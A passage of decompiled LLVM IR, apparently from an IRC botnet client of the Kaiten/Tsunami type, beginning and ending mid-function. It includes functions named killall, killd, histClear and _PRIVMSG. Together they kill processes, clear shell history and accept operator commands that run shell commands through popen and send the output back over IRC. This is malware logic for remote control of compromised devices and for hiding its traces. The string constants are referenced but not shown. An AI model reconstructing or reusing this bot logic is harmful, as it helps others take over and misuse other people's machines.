  %v1_19ce4 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19cf4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_39714.981 to i32))
  %v1_19cfc = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19d0c = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_39748.983 to i32))
  %v1_19d14 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19d24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([63 x i8]* @global_var_39780.985 to i32))
  %v1_19d2c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19d3c = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_397c0.987 to i32))
  %v1_19d44 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19d54 = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_39804.989 to i32))
  %v1_19d5c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19d6c = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_39844.991 to i32))
  %v1_19d74 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19d84 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_3986c.993 to i32))
  %v1_19d8c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19d9c = call i32 @Send(i32 %arg1, i32 ptrtoint ([101 x i8]* @global_var_3988c.995 to i32))
  %v1_19da4 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19db4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_398f4.997 to i32))
  %v1_19dbc = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19dcc = call i32 @Send(i32 %arg1, i32 ptrtoint ([108 x i8]* @global_var_39938.999 to i32))
  %v1_19dd4 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19de4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_399a4.1001 to i32))
  %v1_19dec = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19dfc = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_399dc.1003 to i32))
  %v1_19e04 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19e14 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_39a14.1005 to i32))
  %v1_19e1c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19e2c = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_39a3c.1007 to i32))
  %v1_19e34 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19e44 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_39a80.1009 to i32))
  %v1_19e4c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19e5c = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_39ab4.1011 to i32))
  %v1_19e64 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19e74 = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_39af8.1013 to i32))
  %v1_19e7c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19e8c = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_39b40.1015 to i32))
  %v1_19e94 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19ea4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_39b7c.1017 to i32))
  %v1_19eac = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19ebc = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_39bd8.1019 to i32))
  %v1_19ec4 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19ed4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([88 x i8]* @global_var_39c14.1021 to i32))
  %v1_19edc = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19eec = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_39c6c.1023 to i32))
  %v1_19ef4 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19f04 = call i32 @Send(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_39ccc.1025 to i32))
  %v1_19f0c = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19f1c = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_39d1c.1027 to i32))
  %v1_19f24 = call i32 @sleep(i32 1)
  store i32 %arg2, i32* @r2, align 4
  %v3_19f34 = call i32 @Send(i32 %arg1, i32 ptrtoint ([111 x i8]* @global_var_39d84.1029 to i32))
  %v1_19f3c = call i32 @sleep(i32 1)
  %v1_19f44 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_19f48

dec_label_pc_19f48:                               ; preds = %entry, %dec_label_pc_19ac0
  %v1_19f50 = phi i32 [ %v1_19ab0, %entry ], [ %v1_19f44, %dec_label_pc_19ac0 ]
  ret i32 %v1_19f50

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_19f48, { 1, 0 }
}

define i32 @killall(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 106528, i32* %stack_var_-4, align 4
  %v2_1a01c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1a01c, i32* @fp, align 4
  %v0_1a024 = load i32, i32* @r0, align 4
  %v2_1a094 = icmp eq i32 %arg2, 0
  %v2_1a10014 = load i32, i32* @global_var_49b48.43, align 4
  %v3_1a10816 = icmp eq i32 %v2_1a10014, 0
  br i1 %v3_1a10816, label %dec_label_pc_1a110, label %dec_label_pc_1a040

dec_label_pc_1a040:                               ; preds = %dec_label_pc_1a0f0, %entry
  %storemerge122 = phi i32 [ %v1_1a0f4, %dec_label_pc_1a0f0 ], [ 0, %entry ]
  %v1_1a11821 = phi i32 [ %v1_1a1182, %dec_label_pc_1a0f0 ], [ %v0_1a024, %entry ]
  %v3_1a044 = mul i32 %storemerge122, 4
  %v2_1a050 = load i32, i32* @global_var_53718.45, align 4
  %v2_1a054 = add i32 %v2_1a050, %v3_1a044
  %v1_1a058 = inttoptr i32 %v2_1a054 to i32*
  %v2_1a058 = load i32, i32* %v1_1a058, align 4
  %v2_1a05c = icmp eq i32 %v2_1a058, 0
  br i1 %v2_1a05c, label %dec_label_pc_1a0f0, label %dec_label_pc_1a064

dec_label_pc_1a064:                               ; preds = %dec_label_pc_1a040
  %v2_1a07c = load i32, i32* %v1_1a058, align 4
  store i32 %v2_1a07c, i32* @r4, align 4
  %v0_1a080 = call i32 @__GI_getpid()
  store i32 %v0_1a080, i32* @r0, align 4
  %v0_1a088 = load i32, i32* @r4, align 4
  %v9_1a088 = icmp eq i32 %v0_1a088, %v0_1a080
  br i1 %v9_1a088, label %dec_label_pc_1a0f0, label %dec_label_pc_1a090

dec_label_pc_1a090:                               ; preds = %dec_label_pc_1a064
  br i1 %v2_1a094, label %dec_label_pc_1a0c8, label %dec_label_pc_1a09c

dec_label_pc_1a09c:                               ; preds = %dec_label_pc_1a090
  store i32 %arg2, i32* @r2, align 4
  %v3_1a0c4 = call i32 @Send(i32 %v0_1a024, i32 ptrtoint ([28 x i8]* @global_var_39df4.1032 to i32))
  br label %dec_label_pc_1a0c8

dec_label_pc_1a0c8:                               ; preds = %dec_label_pc_1a090, %dec_label_pc_1a09c
  %v2_1a0d8 = load i32, i32* @global_var_53718.45, align 4
  %v2_1a0dc = add i32 %v2_1a0d8, %v3_1a044
  %v1_1a0e0 = inttoptr i32 %v2_1a0dc to i32*
  %v2_1a0e0 = load i32, i32* %v1_1a0e0, align 4
  %v2_1a0ec = call i32 @kill(i32 %v2_1a0e0, i32 9)
  store i32 %v2_1a0ec, i32* @r0, align 4
  br label %dec_label_pc_1a0f0

dec_label_pc_1a0f0:                               ; preds = %dec_label_pc_1a064, %dec_label_pc_1a040, %dec_label_pc_1a0c8
  %v1_1a1182 = phi i32 [ %v0_1a080, %dec_label_pc_1a064 ], [ %v1_1a11821, %dec_label_pc_1a040 ], [ %v2_1a0ec, %dec_label_pc_1a0c8 ]
  %v1_1a0f4 = add i32 %storemerge122, 1
  %v2_1a100 = load i32, i32* @global_var_49b48.43, align 4
  %v3_1a108 = icmp ult i32 %v1_1a0f4, %v2_1a100
  br i1 %v3_1a108, label %dec_label_pc_1a040, label %dec_label_pc_1a110

dec_label_pc_1a110:                               ; preds = %dec_label_pc_1a0f0, %entry
  %v1_1a118.lcssa = phi i32 [ %v0_1a024, %entry ], [ %v1_1a1182, %dec_label_pc_1a0f0 ]
  ret i32 %v1_1a118.lcssa

; uselistorder directives
  uselistorder i32 %v1_1a0f4, { 1, 0 }
  uselistorder i32 %v3_1a044, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_1a024, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_1a0f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a0c8, { 1, 0 }
}

define i32 @killd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1040 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 106804, i32* %stack_var_-4, align 4
  %v2_1a130 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1a130, i32* @fp, align 4
  %v2_1a14c = ptrtoint i32* %stack_var_-1040 to i32
  store i32 1024, i32* @r2, align 4
  store i32 %v2_1a14c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_1a15c = call i32 @__GI_memset()
  %v2_1a164 = load i8, i8* bitcast (i8** @global_var_49b3c.37 to i8*), align 4
  %v7_1a168 = icmp eq i8 %v2_1a164, 1
  br i1 %v7_1a168, label %dec_label_pc_1a1a4, label %dec_label_pc_1a170

dec_label_pc_1a170:                               ; preds = %entry
  %v2_1a174 = load i32, i32* @global_var_5259c.1036, align 4
  store i32 %v2_1a14c, i32* @r0, align 4
  %v4_1a188 = call i32 @sprintf(i32 %v2_1a14c, i32 ptrtoint ([21 x i8]* @global_var_39e10.1038 to i32), i32 %v2_1a174)
  %v1_1a198 = call i32 @system(i32 %v2_1a14c)
  %v1_1a1a0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1a1a4

dec_label_pc_1a1a4:                               ; preds = %entry, %dec_label_pc_1a170
  %v1_1a1ac = phi i32 [ %v0_1a15c, %entry ], [ %v1_1a1a0, %dec_label_pc_1a170 ]
  ret i32 %v1_1a1ac

; uselistorder directives
  uselistorder i32 %v2_1a14c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @system, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1a1a4, { 1, 0 }
}

define i32 @append(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_1a1bc = ptrtoint i32* %stack_var_0 to i32
  %v3_1a1c0 = load i32, i32* @fp, align 4
  %v10_1a1c0 = load i32, i32* @lr, align 4
  store i32 106952, i32* %stack_var_-4, align 4
  %v2_1a1c4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1a1c4, i32* @fp, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v2_1a1dc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_1a1dc, i32* @r0, align 4
  %v12_1a1f0 = call i32 @__GI_asprintf(i32 %v2_1a1dc, i32 ptrtoint ([5 x i8]* @global_var_39e28.1040 to i32), i32 %arg1, i32 %arg2, i32 %arg2, i32 %arg1, i32 0, i32 %v3_1a1c0, i32 %v1_1a1bc, i32 %v10_1a1c0, i32 106952)
  %v3_1a1f4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_1a1c0, i32* @fp, align 4
  store i32 %v10_1a1c0, i32* @lr, align 4
  ret i32 %v3_1a1f4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @ismaster(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_1a210 = load i32, i32* @fp, align 4
  store i32 107032, i32* %stack_var_-4, align 4
  %v2_1a214 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1a214, i32* @fp, align 4
  br label %dec_label_pc_1a2a0

dec_label_pc_1a234:                               ; preds = %dec_label_pc_1a2a0
  %v3_1a238 = mul i32 %storemerge2, 4
  %v2_1a244 = add i32 %v3_1a238, %arg2
  %v1_1a248 = inttoptr i32 %v2_1a244 to i32*
  %v2_1a248 = load i32, i32* %v1_1a248, align 4
  %v3_1a254 = call i32 @append(i32 %v2_1a248, i32 ptrtoint (i32* @global_var_39e30.1042 to i32), i32 %v3_1a238)
  %v4_1a260 = inttoptr i32 %v3_1a254 to i8*
  %v3_1a264 = call i32 @strlen(i8* %v4_1a260)
  store i32 %arg1, i32* @r1, align 4
  %v4_1a278 = call i32 @__GI_strncmp(i8* %v4_1a260, i32 %arg1, i32 %v3_1a264)
  %v2_1a280 = icmp eq i32 %v4_1a278, 0
  %v1_1a298 = add nuw i32 %storemerge2, 1
  br i1 %v2_1a280, label %dec_label_pc_1a2b8, label %dec_label_pc_1a2a0

dec_label_pc_1a2a0:                               ; preds = %dec_label_pc_1a234, %entry
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_1a298, %dec_label_pc_1a234 ]
  %v5_1a2ac = icmp slt i32 %storemerge2, %arg3
  br i1 %v5_1a2ac, label %dec_label_pc_1a234, label %dec_label_pc_1a2b8

dec_label_pc_1a2b8:                               ; preds = %dec_label_pc_1a2a0, %dec_label_pc_1a234
  %storemerge3 = phi i32 [ 1, %dec_label_pc_1a234 ], [ 0, %dec_label_pc_1a2a0 ]
  store i32 %v3_1a210, i32* @fp, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @histClear(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 107228, i32* %stack_var_-4, align 4
  %v2_1a2d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1a2d8, i32* @fp, align 4
  %v0_1a2f0 = call i32 @ClearHistory()
  store i32 %arg2, i32* @r2, align 4
  %v3_1a300 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_39e34.1044 to i32))
  ret i32 %v3_1a300

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp61 = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-2180 = alloca i32, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 107296, i32* %stack_var_-4, align 4
  %v2_1a31c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1a31c, i32* @fp, align 4
  %v2_1a338 = load i32, i32* @global_var_44ad4.1046, align 4
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v5_1a348 = call i32 @ismaster(i32 %tmp61, i32 ptrtoint ([4 x i8*]* @global_var_44ad8.1052 to i32), i32 %v2_1a338)
  store i32 %v5_1a348, i32* %r0.global-to-local, align 4
  %v2_1a350 = icmp eq i32 %v5_1a348, 0
  br i1 %v2_1a350, label %dec_label_pc_1b404, label %dec_label_pc_1a370

dec_label_pc_1a364:                               ; preds = %dec_label_pc_1a388
  %v1_1a368 = add i32 %storemerge10, 1
  br label %dec_label_pc_1a370

dec_label_pc_1a370:                               ; preds = %entry, %dec_label_pc_1a364
  %storemerge10 = phi i32 [ %v1_1a368, %dec_label_pc_1a364 ], [ 0, %entry ]
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v3_1a378 = call i32 @strlen(i8* %tmp)
  store i32 %v3_1a378, i32* %r0.global-to-local, align 4
  %v3_1a380 = icmp ult i32 %storemerge10, %v3_1a378
  br i1 %v3_1a380, label %dec_label_pc_1a388, label %dec_label_pc_1a370.dec_label_pc_1a3a4_crit_edge

dec_label_pc_1a370.dec_label_pc_1a3a4_crit_edge:  ; preds = %dec_label_pc_1a370
  %.pre = add i32 %storemerge10, %arg3
  %.pre53 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_1a3a4

dec_label_pc_1a388:                               ; preds = %dec_label_pc_1a370
  %v2_1a394 = add i32 %storemerge10, %arg3
  %v1_1a398 = inttoptr i32 %v2_1a394 to i8*
  %v2_1a398 = load i8, i8* %v1_1a398, align 1
  %v7_1a39c = icmp eq i8 %v2_1a398, 32
  br i1 %v7_1a39c, label %dec_label_pc_1a3a4, label %dec_label_pc_1a364

dec_label_pc_1a3a4:                               ; preds = %dec_label_pc_1a388, %dec_label_pc_1a370.dec_label_pc_1a3a4_crit_edge
  %v3_1a3b8.pre-phi = phi i8* [ %.pre53, %dec_label_pc_1a370.dec_label_pc_1a3a4_crit_edge ], [ %v1_1a398, %dec_label_pc_1a388 ]
  %v2_1a3b0.pre-phi = phi i32 [ %.pre, %dec_label_pc_1a370.dec_label_pc_1a3a4_crit_edge ], [ %v2_1a394, %dec_label_pc_1a388 ]
  store i8 0, i8* %v3_1a3b8.pre-phi, align 1
  %v1_1a3d4 = add i32 %v2_1a3b0.pre-phi, 2
  %v5_1a3d8 = inttoptr i32 %v1_1a3d4 to i8*
  br label %dec_label_pc_1a3f4

dec_label_pc_1a3e8:                               ; preds = %dec_label_pc_1a40c
  %v1_1a3ec = add i32 %storemerge11, 1
  br label %dec_label_pc_1a3f4

dec_label_pc_1a3f4:                               ; preds = %dec_label_pc_1a3a4, %dec_label_pc_1a3e8
  %storemerge11 = phi i32 [ 0, %dec_label_pc_1a3a4 ], [ %v1_1a3ec, %dec_label_pc_1a3e8 ]
  store i32 %storemerge11, i32* @r4, align 4
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v3_1a3fc = call i32 @strlen(i8* %arg2)
  store i32 %v3_1a3fc, i32* %r0.global-to-local, align 4
  %v0_1a404 = load i32, i32* @r4, align 4
  %v3_1a404 = icmp ult i32 %v0_1a404, %v3_1a3fc
  br i1 %v3_1a404, label %dec_label_pc_1a40c, label %dec_label_pc_1a3f4.dec_label_pc_1a428_crit_edge

dec_label_pc_1a3f4.dec_label_pc_1a428_crit_edge:  ; preds = %dec_label_pc_1a3f4
  %.pre54 = add i32 %storemerge11, %tmp61
  %.pre55 = inttoptr i32 %.pre54 to i8*
  br label %dec_label_pc_1a428

dec_label_pc_1a40c:                               ; preds = %dec_label_pc_1a3f4
  %v2_1a418 = add i32 %storemerge11, %tmp61
  %v1_1a41c = inttoptr i32 %v2_1a418 to i8*
  %v2_1a41c = load i8, i8* %v1_1a41c, align 1
  %v7_1a420 = icmp eq i8 %v2_1a41c, 33
  br i1 %v7_1a420, label %dec_label_pc_1a428, label %dec_label_pc_1a3e8

dec_label_pc_1a428:                               ; preds = %dec_label_pc_1a40c, %dec_label_pc_1a3f4.dec_label_pc_1a428_crit_edge
  %v3_1a43c.pre-phi = phi i8* [ %.pre55, %dec_label_pc_1a3f4.dec_label_pc_1a428_crit_edge ], [ %v1_1a41c, %dec_label_pc_1a40c ]
  store i8 0, i8* %v3_1a43c.pre-phi, align 1
  %v2_1a444 = load i8, i8* %v5_1a3d8, align 1
  %v7_1a448 = icmp eq i8 %v2_1a444, 33
  br i1 %v7_1a448, label %dec_label_pc_1a450, label %dec_label_pc_1b404

dec_label_pc_1a450:                               ; preds = %dec_label_pc_1a428
  %v2_1a454 = load i32, i32* @global_var_53710.671, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v4_1a460 = call i32 @__GI_strcasecmp(i8* %tmp, i32 %v2_1a454)
  store i32 %v4_1a460, i32* %r0.global-to-local, align 4
  %v2_1a468 = icmp eq i32 %v4_1a460, 0
  br i1 %v2_1a468, label %dec_label_pc_1a470, label %dec_label_pc_1b404

dec_label_pc_1a470:                               ; preds = %dec_label_pc_1a450
  %v2_1a478 = ptrtoint i32* %stack_var_-1156 to i32
  store i32 1024, i32* @r2, align 4
  store i32 %v2_1a478, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v0_1a488 = call i32 @__GI_memset()
  store i32 %v0_1a488, i32* %r0.global-to-local, align 4
  %v1_1a498 = add i32 %v2_1a3b0.pre-phi, 3
  %v5_1a49c = inttoptr i32 %v1_1a498 to i8*
  br label %dec_label_pc_1a4b8

dec_label_pc_1a4ac:                               ; preds = %dec_label_pc_1a4d0
  %v1_1a4b0 = add i32 %storemerge12, 1
  br label %dec_label_pc_1a4b8

dec_label_pc_1a4b8:                               ; preds = %dec_label_pc_1a470, %dec_label_pc_1a4ac
  %storemerge12 = phi i32 [ 0, %dec_label_pc_1a470 ], [ %v1_1a4b0, %dec_label_pc_1a4ac ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %v1_1a498, i32* %r0.global-to-local, align 4
  %v3_1a4c0 = call i32 @strlen(i8* %v5_1a49c)
  store i32 %v3_1a4c0, i32* %r0.global-to-local, align 4
  %v0_1a4c8 = load i32, i32* @r4, align 4
  %v3_1a4c8 = icmp ult i32 %v0_1a4c8, %v3_1a4c0
  br i1 %v3_1a4c8, label %dec_label_pc_1a4d0, label %dec_label_pc_1a4b8.dec_label_pc_1a4ec_crit_edge

dec_label_pc_1a4b8.dec_label_pc_1a4ec_crit_edge:  ; preds = %dec_label_pc_1a4b8
  %.pre56 = add i32 %storemerge12, %v1_1a498
  %.pre57 = inttoptr i32 %.pre56 to i8*
  br label %dec_label_pc_1a4ec

dec_label_pc_1a4d0:                               ; preds = %dec_label_pc_1a4b8
  %v2_1a4dc = add i32 %storemerge12, %v1_1a498
  %v1_1a4e0 = inttoptr i32 %v2_1a4dc to i8*
  %v2_1a4e0 = load i8, i8* %v1_1a4e0, align 1
  %v7_1a4e4 = icmp eq i8 %v2_1a4e0, 32
  br i1 %v7_1a4e4, label %dec_label_pc_1a4ec, label %dec_label_pc_1a4ac

dec_label_pc_1a4ec:                               ; preds = %dec_label_pc_1a4d0, %dec_label_pc_1a4b8.dec_label_pc_1a4ec_crit_edge
  %v3_1a500.pre-phi = phi i8* [ %.pre57, %dec_label_pc_1a4b8.dec_label_pc_1a4ec_crit_edge ], [ %v1_1a4e0, %dec_label_pc_1a4d0 ]
  store i8 0, i8* %v3_1a500.pre-phi, align 1
  %v2_1a508 = load i32, i32* @global_var_52594.89, align 4
  store i32 %v1_1a498, i32* %r0.global-to-local, align 4
  %v3_1a514 = call i32 @strwildmatch(i8* %v5_1a49c, i32 %v2_1a508)
  store i32 %v3_1a514, i32* %r0.global-to-local, align 4
  %v2_1a51c = icmp eq i32 %v3_1a514, 0
  br i1 %v2_1a51c, label %dec_label_pc_1a524, label %dec_label_pc_1b404

dec_label_pc_1a524:                               ; preds = %dec_label_pc_1a4ec
  %v1_1a528 = add i32 %v2_1a3b0.pre-phi, 4
  %v2_1a530 = add i32 %v1_1a528, %storemerge12
  %v5_1a534 = inttoptr i32 %v2_1a530 to i8*
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_39f74.1056 to i32), i32* @r1, align 4
  %v5_1a544 = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([5 x i8]* @global_var_39f74.1056 to i32), i32 4)
  store i32 %v5_1a544, i32* %r0.global-to-local, align 4
  %v2_1a54c = icmp eq i32 %v5_1a544, 0
  br i1 %v2_1a54c, label %dec_label_pc_1a554, label %dec_label_pc_1a590

dec_label_pc_1a554:                               ; preds = %dec_label_pc_1a524
  %v2_1a558 = load i8, i8* bitcast (i8** @global_var_49b3c.37 to i8*), align 4
  %v2_1a55c = icmp eq i8 %v2_1a558, 0
  br i1 %v2_1a55c, label %dec_label_pc_1a578, label %dec_label_pc_1a564

dec_label_pc_1a564:                               ; preds = %dec_label_pc_1a554
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1a570 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_36a90.41 to i32))
  store i32 %v3_1a570, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a590

dec_label_pc_1a578:                               ; preds = %dec_label_pc_1a554
  %v1_1a57c = add i32 %v2_1a530, 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %v1_1a57c, i32* @r2, align 4
  %v3_1a58c = call i32 @Send(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_39f7c.1060 to i32))
  store i32 %v3_1a58c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a590

dec_label_pc_1a590:                               ; preds = %dec_label_pc_1a524, %dec_label_pc_1a564, %dec_label_pc_1a578
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_39f80.1062 to i32), i32* @r1, align 4
  %v5_1a59c = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([4 x i8]* @global_var_39f80.1062 to i32), i32 3)
  store i32 %v5_1a59c, i32* %r0.global-to-local, align 4
  %v2_1a5a4 = icmp eq i32 %v5_1a59c, 0
  br i1 %v2_1a5a4, label %dec_label_pc_1a5ac, label %dec_label_pc_1a6a0

dec_label_pc_1a5ac:                               ; preds = %dec_label_pc_1a590
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1a5b0 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1a5b0, i32* %r0.global-to-local, align 4
  %v2_1a5b8 = icmp eq i32 %v2_1a5b0, 0
  br i1 %v2_1a5b8, label %dec_label_pc_1a5c0, label %dec_label_pc_1b404

dec_label_pc_1a5c0:                               ; preds = %dec_label_pc_1a5ac
  %v2_1a5c8 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1a5c8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1a5d8 = call i32 @__GI_memset()
  %v1_1a5e0 = add i32 %v2_1a530, 3
  store i32 %v2_1a5c8, i32* @r0, align 4
  %v4_1a5f8 = call i32 @sprintf(i32 %v2_1a5c8, i32 ptrtoint ([69 x i8]* @global_var_39f84.1064 to i32), i32 %v1_1a5e0)
  store i32 %v2_1a5c8, i32* %r0.global-to-local, align 4
  %v3_1a610 = call i32 @popen(i32 %v2_1a5c8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1a610, i32* %r0.global-to-local, align 4
  %v1_1a680 = inttoptr i32 %v3_1a610 to i16*
  %v2_1a68050 = call i32 @feof(i16* %v1_1a680)
  store i32 %v2_1a68050, i32* %r0.global-to-local, align 4
  %v2_1a68852 = icmp eq i32 %v2_1a68050, 0
  br i1 %v2_1a68852, label %dec_label_pc_1a620, label %dec_label_pc_1a690

dec_label_pc_1a620:                               ; preds = %dec_label_pc_1a5c0, %dec_label_pc_1a620
  store i32 %v2_1a5c8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1a638 = call i32 @__GI_memset()
  store i32 %v2_1a5c8, i32* %r0.global-to-local, align 4
  %v3_1a654 = call i32 @fgets(i32 %v2_1a5c8, i32 1024, i32 %v3_1a610)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1a670 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1a678 = call i32 @sleep(i32 1)
  store i32 %v3_1a610, i32* %r0.global-to-local, align 4
  %v2_1a680 = call i32 @feof(i16* %v1_1a680)
  store i32 %v2_1a680, i32* %r0.global-to-local, align 4
  %v2_1a688 = icmp eq i32 %v2_1a680, 0
  br i1 %v2_1a688, label %dec_label_pc_1a620, label %dec_label_pc_1a690

dec_label_pc_1a690:                               ; preds = %dec_label_pc_1a620, %dec_label_pc_1a5c0
  store i32 %v3_1a610, i32* %r0.global-to-local, align 4
  %v1_1a694 = call i32 @pclose(i32 %v3_1a610)
  store i32 0, i32* %r0.global-to-local, align 4
